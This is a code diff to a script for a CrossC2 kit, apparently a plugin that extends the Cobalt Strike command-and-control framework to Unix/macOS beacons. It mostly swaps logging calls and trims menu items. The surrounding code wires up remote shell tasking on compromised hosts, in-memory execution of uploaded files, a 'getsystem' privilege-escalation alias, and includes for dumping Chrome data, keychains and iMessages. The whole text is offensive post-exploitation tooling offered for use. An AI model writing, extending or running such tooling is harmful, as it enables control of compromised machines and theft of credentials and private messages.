@@ -14,6 +14,7 @@ include(script_resource("gather/browser/chrome_dump.cna"));
 include(script_resource("gather/keychain/keychain_dump.cna"));
 include(script_resource("gather/message/iMessage_dump.cna"));
 include(script_resource("utils/portscan_result.cna"));
+include(script_resource("process/processhelper.cna"));
 
 sub openMemoryFileLoadDialogCallBack {
     $taskFile = $3['taskFile'];
@@ -55,7 +56,7 @@ sub openMemoryFileLoadDialog {
 
 sub openPythonImportDialogDialogCallBack {
     $pythonFile = $3['pythonFile'];
-    blog($beaconid, $pythonFile);
+    btask($beaconid, $pythonFile);
     $taskResType = "info"; # info -> normal message
     $scriptType = 'python-import$';
     $scriptEnginePath = 'null';
@@ -67,7 +68,7 @@ sub openPythonImportDialogDialogCallBack {
     $filename = substr($scriptLocalPath, $pathIndex);
 
     $importName = substr($filename, 0, lindexOf($filename, '.'));
-    blog($1, "[Python]: import ".$importName);
+    btask($1, "[Python]: import ".$importName);
     $scriptType = $scriptType.$importName;
 
     if ($scriptType && $scriptLocalPath) {
@@ -103,7 +104,7 @@ sub openRunMemoryFileDialogCallBack {
     } else {
         $shell = "cc2-run ".$fileAliasName." ".$taskArgs;
     }
-    blog($beaconid, "[shell]: shell ".$shell);
+    btask($beaconid, "[shell]: shell ".$shell);
     bshell($beaconid, $shell);
 }
 
@@ -124,7 +125,7 @@ sub openRunMemoryFileDialog {
 sub openSetEnvDialogCallBack {
     $envKey = $3['envKey'];
     $envValue = $3['envValue'];
-    blog($beaconid, "[shell]: shell setenv $envKey $envValue");
+    btask($beaconid, "[shell]: shell setenv $envKey $envValue");
     bshell($beaconid, "setenv $envKey $envValue");
 }
 
@@ -145,19 +146,10 @@ popup ssh {
     menu "&Access" {
         item "&Elevate" { openElevateDialog($1); }
     }
-    menu "&Explore" {
-        item "&File Browser" { 
-            local('$bid');
-            foreach $bid ($1) {
-                openFileBrowser($bid);
-            }
-        }
-        item "&Process List" { openProcessBrowser($1); }
-    }
     menu "&CrossC2 Kit" {
         menu "&executable" {
             item "&list" {
-                blog($1, "[shell]: shell cc2-memoryList");
+                btask($1, "[shell]: shell cc2-memoryList");
                 bshell($1, "cc2-memoryList");
             }
             item "&load" {
@@ -176,28 +168,21 @@ popup ssh {
             openPythonImportDialog($1);
         }
     }
-    item "&Spawn" { 
-        local('$bid');
-        foreach $bid ($1) {
-            blog($bid, "[shell]: shell spawn");
-            bshell($bid, "spawn");
-        }
-    }
 }
 
 ssh_alias spawn {
-    blog($1, "[shell]: shell spawn");
+    btask($1, "[shell]: shell spawn");
     bshell($1, "spawn");
 }
 
 ssh_alias getsystem {
-    blog($1, "[shell]: shell getsystem");
+    btask($1, "[shell]: shell getsystem");
     bshell($1, "getsystem");
 }
 
 ssh_alias setenv {
     if($2 && $3){
-        blog($1, "[shell]: shell setenv $2 $3");
+        btask($1, "[shell]: shell setenv $2 $3");
         bshell($1, "setenv $2 $3");
     } else {
         berror($1, "*[error]: setenv env_name env_value");
